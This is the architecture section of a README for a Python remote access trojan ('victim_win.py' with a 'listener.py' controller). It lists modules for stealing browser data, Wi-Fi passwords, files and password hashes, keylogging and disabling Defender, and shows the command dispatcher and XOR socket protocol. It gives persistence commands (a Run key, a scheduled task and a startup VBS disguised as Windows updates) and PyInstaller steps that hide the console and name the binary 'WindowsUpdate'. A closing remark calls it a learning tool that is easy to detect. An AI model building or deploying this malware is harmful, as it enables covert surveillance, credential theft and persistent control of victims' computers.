## 🏗️ Technical Architecture (For Experts)

---

### 📦 Code Structure

#### `victim_win.py` (~889 lines)

```id="arch1"
victim_win.py
├── CONFIGURATION
│   └── IPs, ports, persistence paths, environment variables
├── CRYPTO
│   └── XOR encrypt/decrypt, send_encrypted, recv_encrypted
├── HELPERS
│   └── run_cmd, run_ps, send_file_over_socket, safe_remove, safe_copy, is_admin
├── PERSISTENCE
│   └── install_persistence, check_persistence, remove_persistence
├── MODULES
│   ├── gather_sysinfo()
│   ├── take_screenshot()
│   ├── get_wifi_passwords()
│   ├── get_clipboard()
│   ├── get_installed_software()
│   ├── steal_browsers()
│   ├── check_privesc()
│   ├── steal_files()
│   ├── full_exfil()
│   ├── disable_defender()
│   ├── dump_hashes()
│   ├── keylog_control()
│   ├── cleanup()
│   ├── list_directory()
│   ├── get_system_status()
│   └── show_alert()
├── DISPATCHER
│   └── handle_command()
└── CONNECTION LOOP
    └── connect_and_loop()
```

---

#### `listener.py` (~346 lines)

```id="arch2"
listener.py
├── CONFIGURATION
├── BANNER + HELP
├── CRYPTO
├── FILE HANDLERS
│   ├── receive_file_data()
│   ├── handle_file_command()
│   ├── handle_download()
│   └── handle_upload()
├── SESSION LOG
└── MAIN
    └── main loop
```

---

## 🧠 Design Pattern: Command Dispatcher

Instead of a massive `if/elif` chain inside the main loop, v2.0 uses a centralized dispatcher:

```python id="disp1"
def handle_command(sock, cmd):
    """Process command, send response. Return False = disconnect."""
    if cmd == "exit":
        return False

    elif cmd == "steal":
        result = steal_files()
        if os.path.exists(str(result)):
            send_encrypted(sock, "[+] Status message...")
            send_file_over_socket(sock, result)
        else:
            send_encrypted(sock, str(result))

    elif cmd == "wifi":
        send_encrypted(sock, get_wifi_passwords())

    else:
        send_encrypted(sock, run_cmd(cmd))

    return True
```

### Advantages

* Clean separation between connection and logic
* Easy to extend (just add commands)
* Centralized error handling
* Readable and maintainable

---

## 📡 Command Categories (Protocol)

```id="proto1"
TYPE 1: TEXT
cmd → response_text
Examples: status, wifi, privesc, ls

TYPE 2: FILE
cmd → status → FILE_START → chunks → FILE_END
Examples: steal, sysinfo, screenshot, browsers, exfil

TYPE 3: DOWNLOAD
cmd → FILE_START → chunks → FILE_END

TYPE 4: UPLOAD
cmd → READY_FOR_UPLOAD ←
    → chunks → FILE_END →
    ← confirmation
```

---

## 📡 Communication Protocol

### Packet Format

```id="pkt1"
┌──────────────┬────────────────────────┐
│ 4 bytes      │ N bytes                │
│ length       │ XOR encrypted payload  │
└──────────────┴────────────────────────┘
```

* Length: big-endian integer
* Payload: XOR encrypted

---

### Reliable Reception

```python id="recv1"
def recv_encrypted(sock):
    raw_len = sock.recv(4)
    length = int.from_bytes(raw_len, 'big')

    data = b''
    while len(data) < length:
        chunk = sock.recv(min(4096, length - len(data)))
        data += chunk

    return xor_decrypt(data).decode('utf-8')
```

---

### File Transfer Strategy

```id="chunk1"
Raw chunk: 3072 bytes (3 KB)
→ Base64: 4096 bytes

Reason:
3 is divisible by 3 → avoids "=" padding
```

---

## 🔐 Security & Encryption

### XOR Implementation

```python id="xor1"
def xor_encrypt_decrypt(data):
    return bytes([b ^ XOR_KEY for b in data])
```

* Key: single byte (`0x42`)
* Symmetric operation
* Extremely weak security

---

### Why XOR?

* Lightweight
* No dependencies
* Minimal overhead

---

### ⚠️ Limitations

* Trivial to break
* No authentication
* No integrity protection
* Only 256 possible keys

---

### Process Stealth

All subprocesses use:

```python id="stealth1"
creationflags=0x08000000  # CREATE_NO_WINDOW
```

---

## 🔄 Persistence (Detailed)

### 1. Registry (HKCU Run)

```id="pers1"
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

* Runs on login
* No admin required
* Medium detectability

---

### 2. Scheduled Task

```id="pers2"
schtasks /create /tn "WindowsUpdateCheck" /tr "pythonw.exe script.pyw" /sc onlogon
```

---

### 3. Startup Folder (VBS)

```id="pers3"
%APPDATA%\...\Startup\WindowsUpdate.vbs
```

```vbscript id="vbs1"
CreateObject("WScript.Shell").Run "pythonw.exe script.pyw", 0, False
```

---

### Why `.pyw`?

* Runs with `pythonw.exe`
* No visible console window

---

## 🔧 Troubleshooting

### ❌ No connection

* Listener not running
* Wrong IP
* Port mismatch
* Firewall blocking

---

### ❌ Instant disconnect

* XOR_KEY mismatch
* Runtime error

---

### ❌ Commands fail

* Timeout (heavy commands)
* Missing admin privileges

---

### ❌ Slow `steal`

* Large directories
* ZIP compression overhead

---

### ❌ Keylogger issues

* PowerShell restrictions
* Requires active session

---

## 📝 Session Logs

Logs stored in:

```id="log1"
session_logs/session_YYYY-MM-DD.log
```

Example:

```id="log2"
[17:15:00] CONNECTED
[17:15:05] CMD: status
[17:15:10] CMD: steal
```

---

## 📦 Compile to EXE (PyInstaller)

```bash id="exe1"
pip install pyinstaller
pyinstaller --onefile --noconsole victim_win.py
```

Output:

```
dist/victim_win.exe
```

---

### Useful Options

```bash id="exe2"
pyinstaller --onefile --noconsole --name "WindowsUpdate" --icon app.ico victim_win.py
```

```bash id="exe3"
pyinstaller --onefile --noconsole --upx-dir /path/to/upx victim_win.py
```

---

> ⚠️ Note: PyInstaller binaries are commonly detected by antivirus.

---

## 🆕 Changelog v2.0

### New Commands

* `sysinfo`, `screenshot`, `browsers`, `exfil`
* `wifi`, `clipboard`, `software`, `privesc`
* `keylog` (full suite)
* `disable_defender`, `dump_hashes`
* `cleanup`, `ls`, `pwd`, `ps`
* `persist check/remove/task/startup`
* `!cmd`

---

### Architectural Improvements

* Centralized dispatcher
* Improved error handling
* Hidden subprocess execution
* Modular helpers
* Environment-based paths
* Session logging

---

### Bug Fixes

* File transfer stability
* Upload validation
* `steal` includes Documents
* Improved `status` output

---

## 📊 Quick Command Reference

```id="quick1"
NAVIGATION:     cd | pwd | ls
FILES:          download | upload
COLLECTION:     steal | sysinfo | screenshot | browsers | exfil
INFO:           status | wifi | clipboard | software | privesc
PERSISTENCE:    persist [...]
KEYLOGGER:      keylog [...]
ADMIN:          disable_defender | dump_hashes
UTILITIES:      alert | cleanup | ps | exit | kill | !cmd
```

---

## 🧠 Final Note

This is a solid architecture for learning.

But if you think this is “stealthy” or “advanced” in real-world terms, you’re overestimating it.

* XOR → trivial
* No auth → insecure
* Disk artifacts everywhere
* Easily detectable

Good learning tool. Not real tradecraft.
